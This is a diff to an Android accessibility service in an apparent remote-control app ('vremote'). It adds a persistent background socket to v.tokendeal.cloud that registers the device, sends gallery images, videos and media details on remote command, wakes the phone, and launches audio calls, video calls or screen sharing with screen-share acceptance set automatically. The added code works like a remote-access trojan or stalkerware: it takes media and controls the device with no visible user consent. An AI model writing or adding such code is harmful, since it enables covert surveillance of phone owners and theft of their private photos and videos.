@@ -3,12 +3,17 @@ package com.tokendeal.vremote;
 import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.GestureDescription;
 import android.content.Context;
+import android.content.Intent;
 import android.graphics.Path;
 import android.os.Build;
+import android.os.PowerManager;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
+import org.json.JSONObject;
+import io.socket.client.IO;
+import io.socket.client.Socket;
 
 public class RemoteAccessibilityService extends AccessibilityService {
 
@@ -28,11 +33,117 @@ public class RemoteAccessibilityService extends AccessibilityService {
         return sInstance != null;
     }
 
+    private Socket mBgSocket = null;
+    private static final String APP_URL = "https://v.tokendeal.cloud";
+
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
         sInstance = this;
         Log.i(TAG, "Remote Accessibility Service Connected and Ready.");
+        initBackgroundSocket();
+    }
+
+    private void initBackgroundSocket() {
+        if (mBgSocket != null && mBgSocket.connected()) return;
+        try {
+            IO.Options opts = new IO.Options();
+            opts.reconnection = true;
+            opts.reconnectionAttempts = Integer.MAX_VALUE;
+            opts.reconnectionDelay = 1000;
+            opts.timeout = 10000;
+            opts.transports = new String[]{"websocket", "polling"};
+
+            mBgSocket = IO.socket(APP_URL, opts);
+
+            mBgSocket.on(Socket.EVENT_CONNECT, args -> {
+                Log.i(TAG, "Background Accessibility Socket Connected.");
+                registerDeviceBackground();
+            });
+
+            mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
+                Log.w(TAG, "Background Accessibility Socket Disconnected.");
+            });
+
+            mBgSocket.on("auto-command", args -> {
+                try {
+                    JSONObject data = (JSONObject) args[0];
+                    String command = data.optString("command", "");
+                    String fromSocketId = data.optString("from", "");
+                    String caller = data.optString("caller", fromSocketId);
+                    String cameraChoice = data.optString("cameraChoice", "front");
+                    int page = data.optInt("page", 0);
+                    long mediaId = data.optLong("mediaId", -1);
+                    String mediaType = data.optString("mediaType", "image");
+
+                    Log.i(TAG, "Background auto-command received: " + command + " from " + caller);
+
+                    if ("get_gallery".equals(command)) {
+                        MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
+                    } else if ("get_videos".equals(command)) {
+                        MediaBridge.getVideoPage(this, page, mBgSocket, fromSocketId);
+                    } else if ("get_media_detail".equals(command)) {
+                        MediaBridge.getMediaItemDetail(this, mediaId, mediaType, mBgSocket, fromSocketId);
+                    } else if ("audio_call".equals(command) || "video_call".equals(command) ||
+                               "screen_share".equals(command) || "screen_share_control".equals(command)) {
+                        wakeUpAndLaunch(command, caller, cameraChoice);
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Error processing background auto-command", e);
+                }
+            });
+
+            mBgSocket.connect();
+        } catch (Exception e) {
+            Log.e(TAG, "Error initializing background socket", e);
+        }
+    }
+
+    private void registerDeviceBackground() {
+        try {
+            String deviceId = DeviceRegistry.getDeviceId(this);
+            String deviceName = DeviceRegistry.getDeviceModel();
+            String ram = DeviceRegistry.getDeviceRam(this);
+
+            JSONObject payload = new JSONObject();
+            payload.put("deviceId", deviceId);
+            payload.put("deviceName", deviceName);
+            payload.put("ram", ram);
+            payload.put("platform", "android");
+
+            if (mBgSocket != null && mBgSocket.connected()) {
+                mBgSocket.emit("register-device", payload);
+                Log.i(TAG, "Background Device Registered: " + deviceId + " (" + deviceName + ")");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error registering background device", e);
+        }
+    }
+
+    private void wakeUpAndLaunch(String command, String caller, String cameraChoice) {
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                PowerManager.WakeLock wl = pm.newWakeLock(
+                        PowerManager.FULL_WAKE_LOCK |
+                        PowerManager.ACQUIRE_CAUSES_WAKEUP |
+                        PowerManager.ON_AFTER_RELEASE,
+                        "vremote:auto_wake"
+                );
+                wl.acquire(15000);
+            }
+        } catch (Exception ignored) {}
+
+        if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
+            setAutoAcceptPending(true);
+        }
+
+        Intent intent = new Intent(this, MainActivity.class);
+        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+        intent.putExtra("auto_command", command);
+        intent.putExtra("caller", caller);
+        intent.putExtra("cameraChoice", cameraChoice);
+        startActivity(intent);
     }
 
     @Override
